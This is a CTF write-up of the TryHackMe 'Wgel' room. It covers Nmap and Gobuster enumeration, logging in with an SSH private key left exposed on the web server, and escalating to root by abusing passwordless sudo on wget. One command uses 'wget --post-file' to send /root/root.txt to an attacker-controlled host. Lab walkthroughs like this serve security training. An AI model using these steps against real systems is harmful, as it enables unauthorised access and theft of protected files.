
```md
# THM - Wgel CTF Writeup

## 🏴 Challenge Overview
**Room Name:** Wgel  
**Difficulty:** Easy  
**Category:** Linux Privilege Escalation / Enumeration  
**Platform:** [TryHackMe](https://tryhackme.com)  

---

## 📜 Summary
This machine involved:
- Enumerating services with **Nmap**  
- Discovering a hidden directory using **Gobuster**  
- Retrieving an SSH private key from a `/sitemap` subdirectory  
- Logging in via SSH  
- Exploiting **wget** misconfiguration to read the root flag  

---

## 🚀 Walkthrough

### 1️⃣ Enumeration
First, scan the target IP to discover open ports and running services:
```bash
nmap -sV <IP>
```
**Findings:**
- **Port 22 (SSH)** — Open, running OpenSSH  
- **Port 80 (HTTP)** — Apache web server running  

---

### 2️⃣ Finding a Username
Inspecting the HTTP service revealed a username that could be used later for SSH access.  

---

### 3️⃣ Directory Bruteforcing
Run **Gobuster** to enumerate directories:
```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
```
Found:  
```
/sitemap
```

---

### 4️⃣ Digging Deeper in `/sitemap`
At first, `/sitemap` seemed empty. Running Gobuster again on `/sitemap`:
```bash
gobuster dir -u http://<IP>/sitemap/ -w /usr/share/wordlists/dirb/common.txt
```
Discovered:
```
/id_rsa
```

---

### 5️⃣ Retrieving the SSH Key
Downloaded the SSH private key from:
```
http://<IP>/sitemap/id_rsa
```
Fixed key permissions:
```bash
chmod 600 id_rsa
```

---

### 6️⃣ SSH Access
Logged in using the discovered username and private key:
```bash
ssh -i id_rsa <username>@<IP>
```
After successful login, retrieved the **user flag**:
```bash
cat user.txt
```

---

### 7️⃣ Privilege Escalation to Root
Check available `sudo` privileges:
```bash
sudo -l
```
Found that **wget** can be run as root without a password.

---

### 8️⃣ Exfiltrating the Root Flag
Used `wget` to send the root flag to my local machine:
```bash
sudo /usr/bin/wget --post-file=/root/root.txt http://<your-ip>:<port>
```
On attacker machine, started a Python HTTP server to receive the file:
```bash
python3 -m http.server 4444
```
**Root flag received!** 🏆

---

## 🎯 Flags Obtained
- **User Flag:** ✅  
- **Root Flag:** ✅  

---
